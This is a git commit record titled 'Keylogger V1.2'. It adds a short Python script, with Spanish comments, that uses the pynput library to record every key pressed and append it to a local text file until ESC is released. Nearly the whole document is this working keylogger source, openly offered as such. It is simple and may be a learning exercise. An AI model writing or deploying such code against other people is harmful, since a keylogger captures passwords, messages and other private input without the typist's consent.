601408a433dbddae15cf564490038d0509d4c053
Zyrakk <150195749+Zyrakk@users.noreply.github.com>
2025-01-29 21:14:49 +0100

    Keylogger V1.2

---
+++ Keylogger_Python/keylogger.py
@@ -0,0 +1,23 @@
+from pathlib import Path
+from pynput import keyboard
+
+# Archivo de salida
+log_file = Path("keylogger_output.txt")
+
+# Crear archivo si no existe
+log_file.touch(exist_ok=True)
+
+def on_press(key):
+    try:
+        log_file.write_text(log_file.read_text() + key.char)
+    except AttributeError:
+        log_file.write_text(log_file.read_text() + f"[{key}]")
+
+# Salir con ESC
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+# Listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
